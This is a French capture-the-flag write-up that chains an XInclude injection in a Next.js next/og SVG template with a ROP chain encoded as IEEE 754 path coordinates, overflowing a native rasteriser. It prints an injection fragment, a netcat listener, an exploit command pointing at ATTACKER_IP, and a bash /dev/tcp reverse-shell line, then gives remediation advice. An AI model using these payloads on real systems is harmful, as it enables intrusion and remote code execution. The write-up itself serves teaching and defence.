# ROPero — XInclude dans next/og et une ROP chain dans un path SVG

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/ropero/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — Une app Next.js rend du texte utilisateur en PNG via `next/og`
> (`ImageResponse`). Mon texte atterrit dans un `<title>` d'un SVG. Je casse la
> balise par **injection XInclude** pour injecter un SVG imbriqué dont un `<path>`
> encode une **ROP chain** dans ses coordonnées IEEE 754. Le rasteriseur natif (sans
> PIE) déborde sur la pile en parsant le path, et j'exécute
> `execve("/bin/sh", …)`. **Flag :** `NCTF{…}`.

## 1. Reconnaissance

- `GET /` — formulaire de prévisualisation de carte.
- `POST /api/card/preview` — accepte du texte brut, renvoie un PNG.
- Le texte est inséré dans `<title>caption</title>` d'un SVG rendu par `next/og`,
  dont le rasteriseur est natif.

## 2. Vulnérabilité

### Injection XInclude

Le texte n'est pas échappé. En envoyant :

```
</title><xi:include .../><title>
```

je casse la structure XML et j'injecte du SVG arbitraire (un second SVG via un
`xi:include` + data URI).

### Débordement dans le rasteriseur, sans PIE

Le rasteriseur parse les coordonnées des `<path>`. Un path assez complexe (152
commandes aux coordonnées choisies) déborde un buffer de pile. Le runtime n'est
**pas compilé en PIE** → les adresses des gadgets sont fixes.

## 3. Chaîne d'exploitation

1. **XInclude** : casser `<title>`, injecter un SVG imbriqué.
2. **SVG imbriqué** : un `<path>` dont l'attribut `d` encode la ROP chain dans ses
   coordonnées flottantes **IEEE 754** (doubles finis, pas de NaN/Inf).
3. **ROP chain** : gadgets fixes (`pop rdi/rax/rsi/rdx`, `stosq`, PLT `execve`)
   pour écrire `/bin/sh`, `-c`, la commande en `.bss`, monter `argv`, puis appeler
   `execve("/bin/sh", ["/bin/sh","-c",CMD], 0)`.
4. **Reverse shell** / exfiltration OOB pour lire le flag.

```bash
# listener
nc -lvnp 4444
# exploit
python3 exploit.py --target <TARGET>:33000 --lhost <ATTACKER_IP>:4444
```

L'exploit construit la chaîne pour
`execve("/bin/sh","-c","bash -i>&/dev/tcp/LHOST/PORT 0>&1")`, encode chaque qword en
coordonnée IEEE 754, assemble le payload XInclude + SVG, et POST sur
`/api/card/preview`. Le rasteriseur crash → la ROP s'exécute → shell → `cat /flag.txt`.

### Contraintes

- commande shell limitée à **71 octets** (place dans le layout ROP) ;
- le path doit rester un SVG valide (commandes `M C A H Z`) ;
- coordonnées = doubles IEEE 754 **finis**.

## 4. Flag

```text
NCTF{…}
```

## 5. Leçons & remédiation

- **Échapper le texte utilisateur** avant de l'insérer dans un gabarit XML/SVG, et
  **désactiver XInclude** dans le parseur.
- **Compiler le rasteriseur en PIE + bornes de pile** : parser des coordonnées
  attaquant sans vérification de taille est une corruption mémoire directe.
